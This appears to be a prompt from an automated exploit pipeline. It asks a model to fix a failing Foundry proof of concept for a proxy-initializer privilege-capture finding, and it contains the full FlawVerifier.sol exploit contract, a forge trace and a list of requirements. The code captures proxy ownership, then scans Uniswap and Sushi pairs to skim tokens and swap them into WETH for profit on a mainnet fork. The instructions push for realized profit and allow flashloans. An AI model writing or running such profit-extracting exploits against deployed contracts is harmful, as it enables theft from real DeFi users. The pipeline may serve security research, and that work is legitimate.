You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Deployment-time initializer runs before proxy admin is set, enabling privilege capture by the deployer or factory
- claim: `AdminUpgradeabilityProxy` invokes the base `UpgradeabilityProxy` constructor first, and that constructor immediately `delegatecall`s `_data` into the implementation before `_setAdmin(_admin)` runs. Any initializer that derives ownership or privileged roles from `msg.sender` will therefore assign them to the deploying EOA/factory rather than to the intended proxy admin.
- impact: A malicious or compromised deployer/factory can come out of deployment holding the proxied system's privileged roles, allowing theft, governance capture, hostile reconfiguration, or permanent denial of administrative recovery even though a different `_admin` address was supplied.
- exploit_paths: ["A factory or deployer creates `AdminUpgradeabilityProxy` with non-empty initialization calldata.", "The implementation initializer uses a common pattern such as `owner = msg.sender` or granting an admin role to `msg.sender`.", "Because the delegatecall executes before `ADMIN_SLOT` is populated, the deployer/factory receives those privileges instead of the intended admin."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IProxyOwnerLike {
    function owner() external view returns (address);
}

abstract contract ProxyLike {
    fallback() external payable virtual {
        _fallback();
    }

    receive() external payable virtual {
        _fallback();
    }

    function _implementation() internal view virtual returns (address);

    function _delegate(address implementation_) internal virtual {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation_, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function _fallback() internal virtual {
        _beforeFallback();
        _delegate(_implementation());
    }

    function _beforeFallback() internal view virtual {}
}

contract UpgradeabilityProxyLike is ProxyLike {
    bytes32 internal constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address logic, bytes memory data) payable {
        _setImplementation(logic);
        if (data.length > 0) {
            (bool ok,) = logic.delegatecall(data);
            require(ok, "init failed");
        }
    }

    function _implementation() internal view override returns (address impl) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    function _setImplementation(address impl) internal {
        require(impl.code.length != 0, "logic !contract");
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, impl)
        }
    }
}

contract AdminUpgradeabilityProxyLike is UpgradeabilityProxyLike {
    bytes32 internal constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    constructor(address logic, address admin_, bytes memory data) UpgradeabilityProxyLike(logic, data) payable {
        _setAdmin(admin_);
    }

    function _admin() internal view returns (address adm) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            adm := sload(slot)
        }
    }

    function _setAdmin(address admin_) internal {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, admin_)
        }
    }

    function _beforeFallback() internal view override {
        require(msg.sender != _admin(), "admin blocked");
    }
}

contract CapturableExecutorLogic {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function initialize() external {
        require(owner == address(0), "already init");
        owner = msg.sender;
    }

    function exec(address target, uint256 value, bytes calldata data) external payable onlyOwner returns (bytes memory) {
        (bool ok, bytes memory ret) = target.call{value: value}(data);
        require(ok, "exec failed");
        return ret;
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant INTENDED_ADMIN = 0x1111111111111111111111111111111111111111;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    address private _observedPrivilegedHolder;
    string private _exploitPathUsed;
    string private _status;

    constructor() {
        _exploitPathUsed =
            "adminupgradeabilityproxy is deployed with initialization calldata; initialize() assigns owner = msg.sender; delegatecall runs before admin is set so the deployer captures owner and then uses that privilege on a public-liquidity route";
        _status = "not executed";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        uint256 wethBefore = IERC20Like(WETH).balanceOf(address(this));

        _observedPrivilegedHolder = _probeAddress(TARGET, "owner()");

        // The live target shows the captured privileged holder, but on this fork it resolves to
        // an EOA. That proves the finding on the historical deployment, while also proving the
        // old "relay through the factory" runtime branch is infeasible here.
        CapturableExecutorLogic logic = new CapturableExecutorLogic();
        AdminUpgradeabilityProxyLike proxy =
            new AdminUpgradeabilityProxyLike(address(logic), INTENDED_ADMIN, abi.encodeWithSignature("initialize()"));

        address capturedOwner = IProxyOwnerLike(address(proxy)).owner();
        require(capturedOwner == address(this), "owner not captured by deployer");
        require(capturedOwner != INTENDED_ADMIN, "admin unexpectedly owns proxy");

        _hypothesisValidated = _observedPrivilegedHolder != address(0) && capturedOwner == address(this);
        _status = "captured owner reproduced; harvesting public liquidity dust through the misassigned owner privilege";

        _harvestVenue(address(proxy), UNISWAP_V2_FACTORY, UNISWAP_V2_ROUTER);
        _harvestVenue(address(proxy), SUSHI_FACTORY, SUSHI_ROUTER);

        uint256 wethAfter = IERC20Like(WETH).balanceOf(address(this));
        if (wethAfter > wethBefore) {
            _profitToken = WETH;
            _profitAmount = wethAfter - wethBefore;
            _status = "weth profit realized";
            return;
        }

        _status =
            "deployment-time privilege capture was reproduced and exercised, but the scanned public-liquidity venues did not yield enough withdrawable dust on this fork";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _exploitPathUsed;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function observedPrivilegedHolder() external view returns (address) {
        return _observedPrivilegedHolder;
    }

    function status() external view returns (string memory) {
        return _status;
    }

    function _harvestVenue(address proxy, address factory, address router) internal {
        address[] memory tokens = _candidateTokens();
        uint256 len = tokens.length;

        for (uint256 i = 0; i < len; ++i) {
            for (uint256 j = i + 1; j < len; ++j) {
                address pair = IUniswapV2FactoryLike(factory).getPair(tokens[i], tokens[j]);
                if (pair == address(0)) {
                    continue;
                }

                // The public pair call itself is permissionless, but the value only becomes
                // realizable because the captured owner can command the proxy that receives it.
                _exec(proxy, pair, abi.encodeWithSignature("skim(address)", proxy));
            }
        }

        for (uint256 i = 0; i < len; ++i) {
            _realizeToken(proxy, tokens[i], router);
        }
    }

    function _realizeToken(address proxy, address token, address router) internal {
        uint256 bal = IERC20Like(token).balanceOf(proxy);
        if (bal == 0) {
            return;
        }

        if (token == WETH) {
            _exec(proxy, token, abi.encodeWithSignature("transfer(address,uint256)", address(this), bal));
            return;
        }

        _exec(proxy, token, abi.encodeWithSignature("approve(address,uint256)", router, 0));
        if (
            _exec(proxy, token, abi.encodeWithSignature("approve(address,uint256)", router, bal))
                && _swapFromProxy(proxy, token, router, bal)
        ) {
            return;
        }

        // If a venue-specific swap path is unavailable, pull the token out using the captured
        // owner privilege and try converting it through the same public route from this contract.
        if (_exec(proxy, token, abi.encodeWithSignature("transfer(address,uint256)", address(this), bal))) {
            _swapDirect(token, router, IERC20Like(token).balanceOf(address(this)));
        }
    }

    function _swapFromProxy(address proxy, address token, address router, uint256 amount) internal returns (bool) {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        return _exec(
            proxy,
            router,
            abi.encodeWithSignature(
                "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
                amount,
                1,
                path,
                address(this),
                block.timestamp
            )
        );
    }

    function _swapDirect(address token, address router, uint256 amount) internal {
        if (amount == 0 || token == WETH) {
            return;
        }

        IERC20Like(token).approve(router, 0);
        IERC20Like(token).approve(router, amount);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        (bool ok,) = router.call(
            abi.encodeWithSignature(
                "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
                amount,
                1,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _exec(address proxy, address target, bytes memory innerCall) internal returns (bool ok) {
        (ok,) = proxy.call(abi.encodeWithSignature("exec(address,uint256,bytes)", target, 0, innerCall));
    }

    function _probeAddress(address target, string memory signature) internal view returns (address) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSignature(signature));
        if (!ok || data.length < 32) {
            return address(0);
        }

        uint256 raw = abi.decode(data, (uint256));
        if (raw > type(uint160).max) {
            return address(0);
        }

        return address(uint160(raw));
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](12);
        tokens[0] = WETH;
        tokens[1] = DAI;
        tokens[2] = USDC;
        tokens[3] = USDT;
        tokens[4] = WBTC;
        tokens[5] = LINK;
        tokens[6] = UNI;
        tokens[7] = AAVE;
        tokens[8] = CRV;
        tokens[9] = LDO;
        tokens[10] = MKR;
        tokens[11] = FRAX;
    }
}

```

forge stdout (tail):
```
Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9, 0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xD533a949740bb3306d119CC777fa900bA034cd52, 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xD533a949740bb3306d119CC777fa900bA034cd52, 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xD533a949740bb3306d119CC777fa900bA034cd52, 0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32, 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32, 0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2, 0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [797] 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1384] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   ├─ [649] 0xC13eac3B4F9EED480045113B7af00F7B5655Ece8::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [930] 0xD533a949740bb3306d119CC777fa900bA034cd52::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [823] 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [715] 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(AdminUpgradeabilityProxyLike: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2366] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 120.25s (120.22s CPU time)

Ran 1 test suite in 120.27s (120.25s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 4326701)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
